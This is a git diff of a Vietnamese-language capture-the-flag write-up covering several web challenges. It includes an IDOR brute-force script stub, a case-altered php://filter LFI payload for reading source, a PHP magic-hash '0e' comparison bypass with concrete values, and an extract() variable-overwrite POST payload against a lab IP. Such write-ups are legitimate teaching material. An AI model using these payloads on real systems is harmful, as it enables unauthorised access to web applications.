@@ -5,7 +5,9 @@
 Challenge lụm flag
 
 **Part 1**: `KCSC{C0r0n4_` --> source-code
+
 **Part 2**: `v1ru22_1s_` --> robots.txt 
+
 **Part 3** : `g0n3_n0w!!}` --> disallowed: /vaccine.php --> /vaccine -> cookies:vaccine=0 --> vaccine=1 
 
 **Flag**: `KCSC{C0r0n4_v1ru22_1s_g0n3_n0w!!}`
@@ -46,11 +48,11 @@ Challenge lụm flag
 
 ## DIOR
 
-Viết láy của `IDOR - Insecure direct object references`: arises when an application u`ses user-supplied input` to access objects `directly`.
+Viết láy của `IDOR - Insecure direct object references`: arises when an application `uses user-supplied input` to access objects `directly`.
 
 ![any](idor.png)
 
-Brute-force flag thôi:
+`Brute-force` flag thôi:
 ```python
 import requests
 
@@ -67,7 +69,7 @@ for i in range(2000):
 
 ## Magic PHP
 
-Web app: 1 page login only admin see flag, another look like vulnerable to LFI.
+Web app: 1 page login -> only admin see flag, another look like vulnerable to LFI.
 
 http://45.77.39.59/?page=secret
 
@@ -76,11 +78,11 @@ Warning: include(/etc/passwd.php): Failed to open stream: No such file or direct
 
 Warning: include(): Failed opening '/etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 14
 ```
-Add extension --> `null byte` --> yes!!
+Add extension --> `null byte` --> *yes!!*
 
-**payload read index**: `pHp://filter/convert.base64-encode/resource=index`
-case-sensitive for bypass!!
+**payload read index.php file**: `pHp://filter/convert.base64-encode/resource=index`
 
+*case-sensitive for bypass!!*
 `index.php`
 ```php
 <?php
@@ -100,7 +102,7 @@ case-sensitive for bypass!!
 ?>
 ```
 
-Đoạn này chẳng có gì nhiều, ngồi đục include to RCE thì là hỏng, chú ý khi không set page thì login sẽ redirect to `login.php`(đọc cho kĩ source-code jump!!).
+Đoạn này chẳng có gì nhiều, ngồi đục include to RCE thì là hỏng, chú ý khi không set `page` paramteter thì login sẽ redirect to `login.php`(đọc cho kĩ source-code jump!!).
 
 `pHp://filter/convert.base64-encode/resource=login`
 
@@ -125,10 +127,9 @@ case-sensitive for bypass!!
   }
 ?>
 ```
+Trông dễ ăn đó, với user_hash thì encrypt interger to 0e(0 mũ = 0) là bypass được --> `0e1137126905:0e291659922323405260514745084877`
 
-Trông dễ ăn đó, với user_hash thì encrypt int to 0e(mũ) là bypass được --> `0e1137126905:0e291659922323405260514745084877`
-
-Hàm extract() extract any variable in POST array. Và nó được gọi sau `$password` tức mình có thể ghi đè!!
+Hàm extract() extract any variable in POST array. Và nó được gọi sau `$password` variable tức mình có thể ghi đè!!
 
 full payload(POST): `user=0e1137126905&password=123&pass=123`
 
